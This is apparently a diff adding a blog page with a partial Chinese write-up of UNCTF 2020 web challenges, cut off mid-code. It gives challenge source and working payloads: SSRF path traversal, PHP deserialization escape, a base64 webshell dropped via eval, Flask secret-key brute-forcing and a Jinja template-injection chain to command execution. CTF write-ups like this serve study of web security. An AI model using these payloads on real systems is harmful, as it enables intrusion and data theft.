@@ -1,0 +1,1383 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>UNCTF 部分writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup">
+  
+
+  
+    <meta name="description" content="记一下">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">UNCTF 部分writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/">
+      UNCTF 部分writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年11月7日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：3.9k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：22分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/" class="leancloud_visitors" data-flag-title="UNCTF 部分writeup">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>记一下</p>
+<a id="more"></a>
+
+<h1 id="UNCTF-2020"><a href="#UNCTF-2020" class="headerlink" title="UNCTF 2020"></a>UNCTF 2020</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/unctf\.com/&#x27;</span>,$url))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接目录穿越 payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;unctf.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$uname,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;easy&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;easychallenge&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>反序列化字符逃逸 正常序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;easychallenge&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ser=serialize(<span class="keyword">new</span> a());</span><br><span class="line"><span class="keyword">echo</span> $ser;</span><br><span class="line"><span class="comment">// O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要添加的字符串 长度29</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>替换后会由9变成13 长度变长4 列方程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9m + 29 &#x3D; 13m</span><br></pre></td></tr></table></figure>
+
+<p>除不尽 尝试增加需要添加的字符串的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa</span><br></pre></td></tr></table></figure>
+
+<p>此时 m= 8 即增加8个<code>challenge</code> payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa</span><br></pre></td></tr></table></figure>
+
+<h3 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\(.*\)/&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> (strpos($data, <span class="string">&#x27;flag&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">&#x27;ByeBye hacker&#x27;</span>;</span><br><span class="line">                 <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                 &#125;);</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#96;echo PD9waHAgCmV2YWwoJF9QT1NUWzFdKTsKPz4&#x3D; | base64 -d &gt; &#x2F;tmp&#x2F;moonback&#96;;</span><br><span class="line">?a&#x3D;include &#39;&#x2F;tmp&#x2F;moonback&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>就成功getshell了 读flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;include &#39;&#x2F;tmp&#x2F;moonback&#39;;</span><br><span class="line">POST: 1&#x3D;system(&#39;cat f* | base64&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>那个正则是可以绕过的 <code>.</code>不匹配换行 payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base64_encode(%<span class="number">0</span>Ashell_exec(%<span class="number">0</span>A<span class="string">&quot;cat flag.php&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">$password  = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;data&#x27;</span>])? $_POST[<span class="string">&#x27;data&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">&#x27;username&#x27;</span>]==$username&amp;&amp;$data_unserialize[<span class="string">&#x27;password&#x27;</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>直接反序列化不行 猜测在包含的时候改了 直接弱类型：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;password&#x27;</span>=&gt;<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
+
+<h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><p>扫目录发现</p>
+<p><img src="/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/image-20201110231144966.png" alt="image-20201110231144966"></p>
+<p>注册登陆后发现有提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;p&gt;--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>爆破secret key 没错了 找到一个项目 直接可以设置字典爆破 <a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a> </p>
+<p>安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask-unsign</span><br></pre></td></tr></table></figure>
+
+<p>指定字典爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign -c eyJ1c2VybmFtZSI6Im1vb25iYWNrIn0.X6tlEw.hNFdL65ytP6FX5DjI_Bdn3shj28 --no-literal-eval -w pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>生成字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line">s = string.ascii_lowercase + string.digits</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> s:</span><br><span class="line">                key = i+j+m+n</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(key+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/image-20201111145639535.png" alt="image-20201111145639535"></p>
+<p>加密不知道为啥不行  后来才知道 原来可以直接注册admin 进去之后会给hint 然后是ssti  贴一下大佬的 payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(117)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()</span><br></pre></td></tr></table></figure>
+
+<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$adminPassword = <span class="string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;fuxkSQL&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span>(<span class="params">$iText</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getVars&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> 